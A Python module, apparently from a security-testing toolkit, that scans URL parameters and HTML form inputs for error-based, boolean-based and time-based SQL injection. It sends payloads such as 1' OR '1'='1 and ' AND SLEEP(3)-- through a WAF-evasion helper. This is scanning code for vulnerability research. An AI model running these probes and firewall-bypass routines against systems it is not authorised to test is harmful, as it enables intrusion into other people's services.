"""SQL injection scanner with mutex-coordinated WAF tamper evasion (`probe_with_mutex_bypass`)."""
import time
import urllib.parse
from core.http import get
from core.waf_bypass import probe_with_mutex_bypass
from core.findings import Finding
from core.memory import log_event

SQL_ERRORS = [
    "sql syntax", "mysql_fetch", "mysql_num_rows", "pg_query", "pg_exec",
    "sqlite3", "ora-01756", "unclosed quotation", "quoted string not properly terminated",
    "microsoft ole db", "odbc sql", "jdbc", "sqlstate", "syntax error",
    "warning: mysql", "valid mysql result", "mysqlclient", "postgresql",
    "you have an error in your sql", "supplied argument is not a valid",
]


def _has_sql_error(text):
    t = (text or "").lower()
    return any(e in t for e in SQL_ERRORS)


def scan_url(url):
    findings = []
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    test_params = list(qs.keys()) if qs else []
    if not test_params:
        return findings

    base_r = get(url)
    base_has_err = _has_sql_error(base_r.text)

    for param in test_params:
        if not base_has_err:
            for payload in ["'", "\"", "1' OR '1'='1", "1'"]:
                r, used_p, bypass_tag = probe_with_mutex_bypass(
                    url, param, payload, vuln_class="sqli", baseline_status=base_r.status or 200
                )
                if r.status == 0:
                    continue
                if _has_sql_error(r.text):
                    findings.append(Finding(
                        id=f"sqli-err-{hash(url + param + used_p) & 0xffff:x}",
                        target=parsed.netloc,
                        type="SQL Injection (error-based)",
                        severity="high",
                        url=url,
                        parameter=param,
                        payload=used_p,
                        evidence="SQL error message in response" + (f" ({bypass_tag})" if bypass_tag else ""),
                        request=r.raw_request,
                        response_snippet=r.snippet(300),
                        confidence=0.85,
                        detected_by="hunter:sqli",
                        waf_bypass_used=bypass_tag,
                    ))
                    break
        try:
            r1, p1, b1 = probe_with_mutex_bypass(url, param, "1' AND '1'='1", vuln_class="sqli", baseline_status=base_r.status or 200)
            r2, _, _ = probe_with_mutex_bypass(url, param, "1' AND '1'='2", vuln_class="sqli", baseline_status=base_r.status or 200)
            if r1.status == 200 and r2.status == 200 and r1.text != r2.text and abs(len(r1.text) - len(r2.text)) > 20:
                findings.append(Finding(
                    id=f"sqli-bool-{hash(url + param) & 0xffff:x}",
                    target=parsed.netloc,
                    type="SQL Injection (boolean-based)",
                    severity="high",
                    url=url,
                    parameter=param,
                    payload=p1,
                    evidence=f"Response length differs: true={len(r1.text)} false={len(r2.text)}",
                    request=r1.raw_request,
                    response_snippet=r1.snippet(200),
                    confidence=0.72,
                    detected_by="hunter:sqli",
                    waf_bypass_used=b1,
                ))
        except Exception:
            pass

        try:
            q = dict(qs)
            q[param] = ["' AND SLEEP(3)--"]
            start = time.time()
            r = get(parsed._replace(query=urllib.parse.urlencode(q, doseq=True)).geturl())
            elapsed = time.time() - start
            if elapsed >= 2.5 and r.status != 0:
                findings.append(Finding(
                    id=f"sqli-time-{hash(url + param) & 0xffff:x}",
                    target=parsed.netloc,
                    type="SQL Injection (time-based)",
                    severity="high",
                    url=url,
                    parameter=param,
                    payload="' AND SLEEP(3)--",
                    evidence=f"Response delayed {elapsed:.2f}s",
                    request=r.raw_request,
                    response_snippet=r.snippet(200),
                    confidence=0.75,
                    detected_by="hunter:sqli",
                ))
        except Exception:
            pass

    log_event(parsed.netloc, "sqli_scan", {"url": url, "findings": len(findings)})
    return findings


def scan_form(form: dict) -> list[Finding]:
    findings = []
    action = form.get("action", "")
    method = (form.get("method") or "GET").upper()
    parsed = urllib.parse.urlparse(action)
    for inp in form.get("inputs", []):
        name = inp.get("name")
        if not name:
            continue
        r, used_p, bypass_tag = probe_with_mutex_bypass(action, name, "1'", vuln_class="sqli", method=method)
        if r.status != 0 and _has_sql_error(r.text):
            findings.append(Finding(
                id=f"sqli-form-{hash(action + name) & 0xffff:x}",
                target=parsed.netloc,
                type="SQL Injection (error-based)",
                severity="high",
                url=action,
                parameter=name,
                payload=used_p,
                evidence=f"Form {method} parameter triggered SQL syntax error",
                request=r.raw_request,
                response_snippet=r.snippet(250),
                confidence=0.82,
                detected_by="hunter:sqli_form",
                waf_bypass_used=bypass_tag,
            ))
            break
    return findings
